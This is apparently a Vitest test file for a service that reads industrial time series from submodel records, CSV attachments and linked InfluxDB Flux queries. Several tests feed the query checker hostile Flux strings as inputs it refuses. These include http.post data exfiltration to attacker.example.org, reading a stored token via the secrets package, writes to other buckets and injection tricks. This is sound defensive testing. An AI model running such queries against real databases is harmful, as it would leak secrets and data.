import type { Connection } from '#shared/contract'
import type { JsonObject } from '~~/server/lib/aas/outline'
import type { ConnectionClient } from '~~/server/lib/connections/client'
import type { TimeSeriesSources } from '~~/server/lib/timeseries/read'
import { describe, expect, it, vi } from 'vitest'
import { parseFluxCsv } from '~~/server/lib/connections/influxdb2'
import { StudioProblem } from '~~/server/lib/problem'
import { parseCsv } from '~~/server/lib/timeseries/csv'
import { checkFluxQuery, interpolateFlux } from '~~/server/lib/timeseries/flux'
import { readTimeSeries, reducePoints } from '~~/server/lib/timeseries/read'
import { parseTime } from '~~/server/lib/timeseries/segments'
import { maxTimeSeriesRangeMs, timeSeriesReadParamsSchema } from '#shared/contract'
import { airQualityConceptDescription, influxAirQualityMultiTable, influxHeader, linkedQuery, timeSeriesSubmodel } from './fixtures'

const connection: Connection = {
  key: 'influx',
  type: 'influxdb2',
  url: 'http://influxdb:8086',
  aliases: ['http://localhost:8086'],
  allowPrivateNetwork: true,
  auth: { scheme: 'token', token: { kind: 'env', ref: 'TOKEN' } },
  settings: {},
}

/** A connection client that answers each Flux query with `answer(query)` and records what was sent. */
function fakeClient (answer: (query: string) => string) {
  const sent: Array<{ path: string, query: Record<string, string> | undefined, body: string | undefined }> = []
  const client: ConnectionClient = {
    connection,
    timeoutMs: 15_000,
    downstreamIdentity: 'connection:influx',
    delegation: undefined,
    request: async (path, request = {}) => {
      sent.push({ path, query: request.query, body: request.body })
      return new Response(answer(request.body ?? ''), { headers: { 'Content-Type': 'text/csv' } })
    },
    text: response => response.text(),
  }
  return { client, sent }
}

function sources (overrides: Partial<TimeSeriesSources> = {}): TimeSeriesSources {
  return {
    submodel: timeSeriesSubmodel(),
    conceptDescription: async id => id === airQualityConceptDescription.id ? airQualityConceptDescription : null,
    attachment: async () => ({ bytes: new TextEncoder().encode(''), contentType: 'text/csv', fileName: 'air.csv' }),
    element: async idShortPath => {
      throw new StudioProblem('target_resource_not_found', `No element ${idShortPath}.`)
    },
    download: async url => {
      throw new StudioProblem('connection_request_refused', `${url} is not an endpoint of this infrastructure.`)
    },
    linked: async endpoint => {
      throw new StudioProblem('connection_not_configured', `Time series database not configured for ${endpoint.origin}.`)
    },
    ...overrides,
  }
}

const day = { start: '2026-05-13T00:00:00Z', stop: '2026-05-14T00:00:00Z' }

function params (overrides: Record<string, unknown> = {}) {
  return timeSeriesReadParamsSchema.parse({ submodelId: 'https://example.org/sm/time-series', segment: 'InternalSegment', time: 'Time', values: ['AirQuality'], range: day, ...overrides })
}

describe('parameters', () => {
  it('accepts idShorts only and bounded ranges', () => {
    expect(timeSeriesReadParamsSchema.safeParse({ ...params(), values: ['x") |> to(bucket: "y'] }).success).toBe(false)
    expect(timeSeriesReadParamsSchema.safeParse({ ...params(), range: { start: day.stop, stop: day.start } }).success).toBe(false)
    expect(timeSeriesReadParamsSchema.safeParse({ ...params(), range: { start: '2010-01-01T00:00:00Z', stop: '2026-01-01T00:00:00Z' } }).success).toBe(false)
    expect(params().maxPoints).toBe(5000)
    expect(params().range.anchor).toBe('fixed')
  })
})

describe('segments and records', () => {
  it('refuses other submodels, unknown segments and records outside the metadata', async () => {
    const other = { ...timeSeriesSubmodel(), semanticId: { keys: [{ value: 'https://example.org/other' }] } }
    await expect(readTimeSeries(params(), sources({ submodel: other }))).rejects.toMatchObject({ code: 'timeseries_invalid' })
    await expect(readTimeSeries(params({ segment: 'Missing' }), sources())).rejects.toMatchObject({ code: 'timeseries_invalid' })
    await expect(readTimeSeries(params({ segment: 'Other' }), sources())).rejects.toMatchObject({ code: 'timeseries_invalid' })
    await expect(readTimeSeries(params({ values: ['Humidity'] }), sources())).rejects.toMatchObject({ code: 'timeseries_invalid', message: expect.stringContaining('Humidity') })
  })
})

describe('InternalSegment', () => {
  it('reads the records of the submodel with units, in the range', async () => {
    const { result } = await readTimeSeries(params({ values: ['AirQuality', 'rpm'] }), sources())
    expect(result.kind).toBe('internal')
    expect(result.series[0]).toEqual({
      key: 'AirQuality',
      unit: 'ppm',
      points: [[Date.parse('2026-05-13T19:15:53.340Z'), 398.98], [Date.parse('2026-05-13T19:15:54.345Z'), 264.02], [Date.parse('2026-05-13T19:20:00Z'), 300]],
    })
    expect(result.series[1]!.points).toHaveLength(2)
    expect(result.warnings).toEqual([{ code: 'points_skipped', params: { value: 'rpm', count: 1 } }])
  })

  it('moves a relative range to the latest point, as the Web UI does', async () => {
    const relative = { start: '2030-01-01T00:00:00Z', stop: '2030-01-01T00:01:00Z', anchor: 'latest' }
    const { result } = await readTimeSeries(params({ range: relative }), sources())
    expect(result.range).toEqual({ start: '2026-05-13T19:19:00.000Z', stop: '2026-05-13T19:20:00.000Z' })
    expect(result.series[0]!.points).toEqual([[Date.parse('2026-05-13T19:20:00Z'), 300]])
  })

  it('thins out series with more points than asked for', async () => {
    const records = Array.from({ length: 50 }, (_, index) => ({
      modelType: 'SubmodelElementCollection',
      idShort: `R${index}`,
      value: [{ modelType: 'Property', idShort: 'Time', value: new Date(Date.parse(day.start) + index * 1000).toISOString() }, { modelType: 'Property', idShort: 'AirQuality', value: String(index) }],
    }))
    const submodel = timeSeriesSubmodel()
    const internal = ((submodel.submodelElements as any[])[1].value as any[])[0]
    internal.value[0].value = records
    const { result } = await readTimeSeries(params({ maxPoints: 10 }), sources({ submodel }))
    expect(result.series[0]!.points.map(([, value]) => value)).toEqual([0, 5, 11, 16, 22, 27, 33, 38, 44, 49])
    expect(result.warnings).toEqual([{ code: 'points_reduced', params: { value: 'AirQuality', count: 50, limit: 10 } }])
    expect(reducePoints([1, 2, 3], 10)).toEqual([1, 2, 3])
  })
})

describe('ExternalSegment', () => {
  const csv = 'time,AirQuality,"Note, quoted"\r\n2026-05-13T19:15:53Z,398.9,"a ""b"""\n2026-05-13T19:15:54Z,264.0,"line\nbreak"\n'

  it('reads a relative File as an attachment of the submodel and parses quoted CSV', async () => {
    const attachment = vi.fn(async () => ({ bytes: new TextEncoder().encode(csv), contentType: 'text/csv', fileName: 'air.csv' }))
    const { result } = await readTimeSeries(params({ segment: 'ExternalSegment' }), sources({ attachment }))
    expect(attachment).toHaveBeenCalledWith('Segments.ExternalSegment.Data')
    expect(result.series[0]!.points).toEqual([[Date.parse('2026-05-13T19:15:53Z'), 398.9], [Date.parse('2026-05-13T19:15:54Z'), 264]])
    expect(parseCsv(csv)).toEqual([['time', 'AirQuality', 'Note, quoted'], ['2026-05-13T19:15:53Z', '398.9', 'a "b"'], ['2026-05-13T19:15:54Z', '264.0', 'line\nbreak']])
  })

  it('downloads absolute URLs only through the target, reads Blobs, and refuses HTML', async () => {
    const absolute = timeSeriesSubmodel({ data: { modelType: 'File', idShort: 'Data', value: 'http://attacker.example.org/air.csv' } })
    await expect(readTimeSeries(params({ segment: 'ExternalSegment' }), sources({ submodel: absolute }))).rejects.toMatchObject({ code: 'connection_request_refused' })

    const blob = timeSeriesSubmodel({ data: { modelType: 'Blob', idShort: 'Data', contentType: 'text/csv', value: Buffer.from('Time,AirQuality\n2026-05-13T19:15:53Z,1\n').toString('base64') } })
    expect((await readTimeSeries(params({ segment: 'ExternalSegment' }), sources({ submodel: blob }))).result.series[0]!.points).toEqual([[Date.parse('2026-05-13T19:15:53Z'), 1]])

    const login = async () => ({ bytes: new TextEncoder().encode('<!DOCTYPE html><html>Sign in</html>'), contentType: 'text/html', fileName: null })
    await expect(readTimeSeries(params({ segment: 'ExternalSegment' }), sources({ attachment: login }))).rejects.toMatchObject({ code: 'timeseries_invalid' })
  })

  it('fetches a Blob value that the submodel read left out', async () => {
    const withoutValue = timeSeriesSubmodel({ data: { modelType: 'Blob', idShort: 'Data', contentType: 'text/csv' } })
    const element = vi.fn(async () => ({ modelType: 'Blob', idShort: 'Data', contentType: 'text/csv', value: Buffer.from('Time,AirQuality\n2026-05-13T19:15:53Z,2\n').toString('base64') }))
    const { result } = await readTimeSeries(params({ segment: 'ExternalSegment' }), sources({ submodel: withoutValue, element }))
    expect(element).toHaveBeenCalledWith('Segments.ExternalSegment.Data')
    expect(result.series[0]!.points).toEqual([[Date.parse('2026-05-13T19:15:53Z'), 2]])
  })

  it('addresses the Data file by the stored idShorts, whatever their case', async () => {
    const submodel = timeSeriesSubmodel()
    const segments = (submodel.submodelElements as JsonObject[]).find(element => element.idShort === 'Segments')!
    segments.idShort = 'segments'
    const attachment = vi.fn(async () => ({ bytes: new TextEncoder().encode(csv), contentType: 'text/csv', fileName: null }))
    await readTimeSeries(params({ segment: 'externalsegment' }), sources({ submodel, attachment }))
    expect(attachment).toHaveBeenCalledWith('segments.ExternalSegment.Data')
  })

  it('reads the File and Blob that IDTA 02008-1-1 defines for an ExternalSegment', async () => {
    const idta = (modelType: 'File' | 'Blob', value?: string) => ({
      modelType,
      idShort: modelType,
      contentType: 'text/csv',
      semanticId: { type: 'ExternalReference', keys: [{ type: 'GlobalReference', value: `https://admin-shell.io/idta/TimeSeries/${modelType}/1/1` }] },
      ...(value === undefined ? {} : { value }),
    })
    const attachment = vi.fn(async () => ({ bytes: new TextEncoder().encode(csv), contentType: 'text/csv', fileName: null }))
    const file = timeSeriesSubmodel({ data: idta('File', '/profile.csv') })
    expect((await readTimeSeries(params({ segment: 'ExternalSegment' }), sources({ submodel: file, attachment }))).result.series[0]!.points).toHaveLength(2)
    expect(attachment).toHaveBeenCalledWith('Segments.ExternalSegment.File')

    const renamed = timeSeriesSubmodel({ data: { ...idta('File', '/profile.csv'), idShort: 'ProfileCsv' } })
    await readTimeSeries(params({ segment: 'ExternalSegment' }), sources({ submodel: renamed, attachment }))
    expect(attachment).toHaveBeenLastCalledWith('Segments.ExternalSegment.ProfileCsv')

    // The template has both; a File without a path leaves the Blob, whose value a submodel read leaves out.
    const both = timeSeriesSubmodel()
    const segment = ((both.submodelElements as JsonObject[])[1]!.value as JsonObject[])[2]!
    segment.value = [idta('File'), idta('Blob')]
    const element = vi.fn(async () => idta('Blob', Buffer.from('Time,AirQuality\n2026-05-13T19:15:53Z,3\n').toString('base64')))
    const { result } = await readTimeSeries(params({ segment: 'ExternalSegment' }), sources({ submodel: both, element }))
    expect(element).toHaveBeenCalledWith('Segments.ExternalSegment.Blob')
    expect(result.series[0]!.points).toEqual([[Date.parse('2026-05-13T19:15:53Z'), 3]])
  })

  it('warns about columns the data does not have', async () => {
    const attachment = async () => ({ bytes: new TextEncoder().encode('time,rpm\n2026-05-13T19:15:53Z,1\n'), contentType: 'text/csv', fileName: null })
    const { result } = await readTimeSeries(params({ segment: 'ExternalSegment', values: ['AirQuality', 'rpm'] }), sources({ attachment }))
    expect(result.warnings).toEqual([{ code: 'value_missing', params: { value: 'AirQuality' } }])
    expect(result.series.map(series => series.points.length)).toEqual([0, 1])
  })
})

describe('LinkedSegment', () => {
  const linked = (client: ConnectionClient) => sources({ linked: async () => client })

  it('sends one checked query per value to the connection and keeps only the organization', async () => {
    const { client, sent } = fakeClient(() => influxAirQualityMultiTable)
    const endpoint = 'http://localhost:8086/api/v2/query?org=basyx&token=leaked'
    const { result, connection: used, queryDigests } = await readTimeSeries(
      params({ segment: 'LinkedSegment', range: { start: '2026-05-13T19:00:00Z', stop: '2026-05-13T20:00:00Z' } }),
      sources({ submodel: timeSeriesSubmodel({ endpoint }), linked: async () => client }),
    )
    expect(sent).toHaveLength(1)
    expect(sent[0]).toMatchObject({ path: '/api/v2/query', query: { org: 'basyx' } })
    expect(sent[0]!.body).toContain('r["_field"] == "AirQuality"')
    expect(sent[0]!.body).toContain('range(start: 2026-05-13T19:00:00.000Z, stop: 2026-05-13T20:00:00.000Z)')
    expect(sent[0]!.body).toContain('aggregateWindow(every: 10000ms')
    expect(sent[0]!.body).not.toMatch(/v\.(?:timeRangeStart|timeRangeStop|windowPeriod)|\{\{y-value\}\}/)
    // The four points of both tables, merged; the topic names the series.
    expect(result.series[0]).toMatchObject({ key: 'AirQuality', unit: 'ppm' })
    expect(result.series[0]!.points).toHaveLength(4)
    expect(used).toEqual({ key: 'influx', type: 'influxdb2', downstreamIdentity: 'connection:influx' })
    expect(queryDigests).toEqual([expect.stringMatching(/^[\da-f]{64}$/)])
  })

  it('reads every value with its own query, unlike the Web UI', async () => {
    const { client, sent } = fakeClient(query => `${influxHeader}\n,_result,0,,,2026-05-13T19:15:53Z,${query.includes('"rpm"') ? 1200 : 400},value,m,h,Line/${query.includes('"rpm"') ? 'Speed' : 'AirQuality'}\n`)
    const { result } = await readTimeSeries(params({ segment: 'LinkedSegment', values: ['AirQuality', 'rpm'] }), linked(client))
    expect(sent).toHaveLength(2)
    // The rpm query's only table is named after its topic (Speed): it is rpm's.
    expect(result.series.map(series => [series.key, series.points[0]?.[1]])).toEqual([['AirQuality', 400], ['rpm', 1200]])
  })

  it('picks series by key from a query without a value placeholder', async () => {
    const query = 'from(bucket: "basyx") |> range(start: v.timeRangeStart, stop: v.timeRangeStop)'
    const csv = `,result,table,_time,_value,_field\n,_result,0,2026-05-13T19:15:53Z,1,airquality\n,_result,1,2026-05-13T19:15:53Z,2,other\n`
    const { client, sent } = fakeClient(() => csv)
    const { result } = await readTimeSeries(params({ segment: 'LinkedSegment', values: ['AirQuality', 'rpm'] }), sources({ submodel: timeSeriesSubmodel({ query }), linked: async () => client }))
    expect(sent).toHaveLength(1)
    expect(result.series.map(series => series.points.length)).toEqual([1, 0])
    expect(result.warnings).toEqual([{ code: 'value_missing', params: { value: 'rpm' } }])
  })

  it('refuses queries that write or import other packages, before contacting anything', async () => {
    const linkedSource = vi.fn()
    for (const query of [
      'from(bucket: "a") |> range(start: -1h) |> to(bucket: "b")',
      'import "http"\nhttp.post(url: "https://attacker.example.org", data: bytes(v: "x"))',
      'import "sql"\nsql.from(driverName: "postgres", dataSourceName: "x", query: "select 1")',
      'import "influxdata/influxdb/secrets"\nsecrets.get(key: "token")',
      'import "experimental"\nexperimental.to(bucket: "b")',
      // A second import on the same line.
      'import "array" import "experimental/http/requests"\nrequests.get(url: "https://attacker.example.org")',
      // Code in a string interpolation runs too.
      'from(bucket: "a") |> range(start: -1h) |> map(fn: (r) => ({ r with s: "${to(bucket: "b")}" }))',
      // A regular expression that would hide the rest from a string-based check.
      'from(bucket: "a") |> filter(fn: (r) => r._field =~ /"/)\nimport "http"',
      'from(bucket: "a", host: "https://attacker.example.org", token: "t") |> range(start: -1h)',
      'from(bucket: "a) |> range(start: -1h)',
      'import http\nfrom(bucket: "a")',
    ]) {
      await expect(readTimeSeries(params({ segment: 'LinkedSegment' }), sources({ submodel: timeSeriesSubmodel({ query }), linked: linkedSource }))).rejects.toMatchObject({ code: 'connection_request_refused' })
    }
    expect(linkedSource).not.toHaveBeenCalled()
    expect(() => checkFluxQuery('import "strings"\nimport agg "experimental/aggregate"\nfrom(bucket: "to(x)") // to(y) import "http"\n|> range(start: -1h)')).not.toThrow()
    expect(() => checkFluxQuery(String.raw`from(bucket: "a") |> filter(fn: (r) => r.host == "x" and r._field =~ /^a\/b"/) |> map(fn: (r) => ({ r with host: "y", v: r._value / 2.0 }))`)).not.toThrow()
  })

  it('checks each query after the record idShorts took the place of {{y-value}}', async () => {
    const submodel = timeSeriesSubmodel({ query: 'im{{y-value}} "http"\nfrom(bucket: "a") |> range(start: v.timeRangeStart)' })
    const metadata = (submodel.submodelElements as JsonObject[]).find(element => element.idShort === 'Metadata')!
    const record = (metadata.value as JsonObject[])[0]!
    ;(record.value as JsonObject[]).push({ modelType: 'Property', idShort: 'port', valueType: 'xs:double' })
    const linkedSource = vi.fn()
    await expect(readTimeSeries(params({ segment: 'LinkedSegment', values: ['port'] }), sources({ submodel, linked: linkedSource }))).rejects.toMatchObject({ code: 'connection_request_refused' })
    expect(linkedSource).not.toHaveBeenCalled()
  })

  it('refuses endpoints that no connection of the infrastructure names', async () => {
    const submodel = timeSeriesSubmodel({ endpoint: 'http://attacker.example.org:8086/api/v2/query?org=basyx' })
    await expect(readTimeSeries(params({ segment: 'LinkedSegment' }), sources({ submodel }))).rejects.toMatchObject({ code: 'connection_not_configured', message: 'Time series database not configured for http://attacker.example.org:8086.' })
    const { client } = fakeClient(() => '')
    const deletion = timeSeriesSubmodel({ endpoint: 'http://localhost:8086/api/v2/delete?org=basyx' })
    await expect(readTimeSeries(params({ segment: 'LinkedSegment' }), sources({ submodel: deletion, linked: async () => client }))).rejects.toMatchObject({ code: 'connection_request_refused' })
  })
})

/**
 * A fake InfluxDB over points (epoch ms) by field (`AirQuality` for a plain
 * list): it honours the query's range (stop left out, as Flux does) and its
 * filter on `_field`, and, for `aggregateWindow`, reports each window at its
 * stop, clamped to the range, as InfluxDB does by default, or at its start
 * with `timeSrc: "_start"`.
 */
function fakeInflux (data: number[] | Record<string, number[]>) {
  const fields = Array.isArray(data) ? { AirQuality: data } : data
  return fakeClient(query => {
    const range = /range\(start: (\S+), stop: (\S+)\)/.exec(query)!
    const [startMs, stopMs] = [Date.parse(range[1]!), Date.parse(range[2]!)]
    const every = Number(/aggregateWindow\(every: (\d+)ms/.exec(query)?.[1] ?? 0)
    const fromStart = query.includes('timeSrc: "_start"')
    const wanted = /_field"\] == "(\w+)"/.exec(query)?.[1]
    const rows = Object.entries(fields).filter(([field]) => !wanted || field === wanted).flatMap(([field, points]) => {
      const inRange = points.filter(time => time >= startMs && time < stopMs)
      const times = every
        ? [...new Set(inRange.map(time => fromStart
            ? Math.max(Math.floor(time / every) * every, startMs)
            : Math.min((Math.floor(time / every) + 1) * every, stopMs)))]
        : inRange
      return times.map(time => `,_result,0,${range[1]},${range[2]},${new Date(time).toISOString()},1,${field},m,h,`)
    })
    return [influxHeader, ...rows].join('\n')
  })
}

describe('LinkedSegment with anchor: latest', () => {
  const hour = 60 * 60 * 1000
  const stop = Date.parse('2026-05-20T12:00:00Z')
  const lastHour = { start: new Date(stop - hour).toISOString(), stop: new Date(stop).toISOString(), anchor: 'latest' }
  const rawQuery = 'from(bucket: "basyx") |> range(start: v.timeRangeStart, stop: v.timeRangeStop) |> filter(fn: (r) => r["_field"] == "{{y-value}}")'
  const read = (client: ConnectionClient, query?: string) => readTimeSeries(
    params({ segment: 'LinkedSegment', range: lastHour }),
    sources({ submodel: timeSeriesSubmodel(query ? { query } : {}), linked: async () => client }),
  )

  it('looks further back with the segment\'s own query and moves the range to the latest point', async () => {
    // Points every minute, the last three days before the range ends.
    const last = stop - 3 * 24 * hour - 17_123
    const points = Array.from({ length: 120 }, (_, index) => last - index * 60_000)
    const { client, sent } = fakeInflux(points)
    const { result, queryDigests } = await read(client, rawQuery)
    expect(result.range).toEqual({ start: new Date(last - hour).toISOString(), stop: new Date(last).toISOString() })
    expect(result.series[0]!.points).toHaveLength(61)
    expect(result.series[0]!.points.at(-1)![0]).toBe(last)
    // 1 h, then 8 h, 64 h and 512 h back, each beyond the last; then the read.
    expect(sent.map(({ body }) => /range\(start: (\S+), stop: (\S+)\)/.exec(body!)!.slice(1).map(time => (stop - Date.parse(time)) / hour))).toEqual([
      [1, 0],
      [8, 1],
      [64, 8],
      [512, 64],
      [(stop - last) / hour + 1, (stop - last - 1) / hour],
    ])
    expect(sent.every(({ body }) => body!.includes('r["_field"] == "AirQuality"'))).toBe(true)
    expect(queryDigests).toHaveLength(sent.length)
  })

  it('narrows a windowed query down to a window no longer than the read\'s own', async () => {
    const last = stop - 40 * 24 * hour - 1234
    const points = Array.from({ length: 500 }, (_, index) => last - index * 5000)
    const { client } = fakeInflux(points)
    const { result } = await read(client)
    const window = hour / 360
    const rangeStop = Date.parse(result.range.stop)
    // The range ends after the window that holds the last point, at most one more window later.
    expect(rangeStop).toBeGreaterThanOrEqual(last)
    expect(rangeStop - last).toBeLessThanOrEqual(2 * window)
    expect(Date.parse(result.range.stop) - Date.parse(result.range.start)).toBe(hour)
    // That window is shown, at its stop; 10 s windows over 2,500 s of points.
    const shown = result.series[0]!.points.at(-1)![0]
    expect(shown).toBeGreaterThanOrEqual(last)
    expect(shown - last).toBeLessThanOrEqual(window)
    expect(result.series[0]!.points.length).toBeGreaterThanOrEqual(250)
  })

  it('keeps the window that holds the latest point when the query reports windows by their start', async () => {
    const point = Date.parse('2026-05-20T11:58:55Z')
    const { client } = fakeInflux([point])
    const { result } = await read(client, `${linkedQuery.replace('fn: mean)', 'fn: mean, timeSrc: "_start")')}`)
    expect(result.range.stop).toBe('2026-05-20T11:59:00.000Z')
    expect(result.series[0]!.points).toEqual([[Date.parse('2026-05-20T11:58:50Z'), 1]])
  })

  it('looks only at the selected series of a query without a value placeholder', async () => {
    const latest = Date.parse('2026-05-20T10:00:00Z')
    const { client } = fakeInflux({ AirQuality: [latest - 60_000, latest], Other: [Date.parse('2026-05-20T11:59:00Z')] })
    const { result } = await read(client, 'from(bucket: "basyx") |> range(start: v.timeRangeStart, stop: v.timeRangeStop)')
    expect(result.range).toEqual({ start: '2026-05-20T09:00:00.000Z', stop: '2026-05-20T10:00:00.000Z' })
    expect(result.series[0]!.points.map(([time]) => time)).toEqual([latest - 60_000, latest])
  })

  it('reads current data with one query', async () => {
    const points = Array.from({ length: 100 }, (_, index) => stop - 1000 - index * 5000)
    const { client, sent } = fakeInflux(points)
    const { result } = await read(client)
    expect(result.range).toEqual({ start: lastHour.start, stop: lastHour.stop })
    expect(sent).toHaveLength(1)
  })

  it('keeps the range as given when no series has a point, after looking back five years', async () => {
    const { client, sent } = fakeInflux([])
    const { result } = await read(client)
    expect(result.range).toEqual({ start: new Date(stop - hour).toISOString(), stop: new Date(stop).toISOString() })
    expect(result.warnings).toEqual([{ code: 'value_missing', params: { value: 'AirQuality' } }])
    const starts = sent.map(({ body }) => Date.parse(/range\(start: (\S+),/.exec(body!)![1]!))
    expect(stop - Math.min(...starts)).toBe(maxTimeSeriesRangeMs)
    expect(sent.length).toBeLessThanOrEqual(8)
  })

  it('moves the range to the latest point of any selected series', async () => {
    const csv = (query: string) => query.includes('"rpm"')
      ? `${influxHeader}\n,_result,0,,,2026-05-20T11:10:00Z,1200,rpm,m,h,`
      : `${influxHeader}\n,_result,0,,,2026-05-20T11:20:00Z,400,AirQuality,m,h,`
    const { client } = fakeClient(csv)
    const { result } = await readTimeSeries(
      params({ segment: 'LinkedSegment', values: ['AirQuality', 'rpm'], range: lastHour }),
      sources({ submodel: timeSeriesSubmodel({ query: rawQuery }), linked: async () => client }),
    )
    expect(result.range.stop).toBe('2026-05-20T11:20:00.000Z')
  })

  it('refuses a query the Flux check refuses, before looking for the latest point', async () => {
    const linkedSource = vi.fn()
    const query = 'from(bucket: "a") |> range(start: v.timeRangeStart, stop: v.timeRangeStop) |> to(bucket: "b")'
    await expect(readTimeSeries(params({ segment: 'LinkedSegment', range: lastHour }), sources({ submodel: timeSeriesSubmodel({ query }), linked: linkedSource }))).rejects.toMatchObject({ code: 'connection_request_refused' })
    expect(linkedSource).not.toHaveBeenCalled()
  })
})

describe('Flux and annotated CSV', () => {
  it('interpolates every placeholder and the dashboard variables', () => {
    const query = interpolateFlux('{{y-value}} {{y-value}} v.timeRangeStart v.timeRangeStop v.windowPeriod v.host', 'rpm', { start: '2026-05-13T19:00:00Z', stop: '2026-05-13T20:00:00Z' })
    expect(query).toBe('rpm rpm 2026-05-13T19:00:00.000Z 2026-05-13T20:00:00.000Z 10000ms v.host')
  })

  it('parses tables as the Web UI does: header rows, _field or topic, merged tables', () => {
    const csv = [
      'garbage',
      ',x',
      ',result,table,_time,_value,_field',
      ',_result,0,2026-01-01T00:00:00Z,12.5,temperature',
      '',
      '#datatype,string,long,dateTime:RFC3339,double,string',
      ',result,table,_time,_value',
      ',_result,0,2026-01-01T00:00:00Z,1',
    ].join('\r\n')
    expect(parseFluxCsv(csv)).toEqual(new Map([['temperature', [{ time: '2026-01-01T00:00:00Z', value: 12.5 }]]]))
    expect(parseFluxCsv(influxAirQualityMultiTable).get('AirQuality')).toHaveLength(4)
  })

  it('parses times as date-times or epoch seconds and milliseconds', () => {
    expect(parseTime('2026-05-13T19:15:53Z')).toBe(Date.parse('2026-05-13T19:15:53Z'))
    expect(parseTime('1778699753')).toBe(1_778_699_753_000)
    expect(parseTime(1_778_699_753_000)).toBe(1_778_699_753_000)
    expect(parseTime('soon')).toBeNull()
  })
})
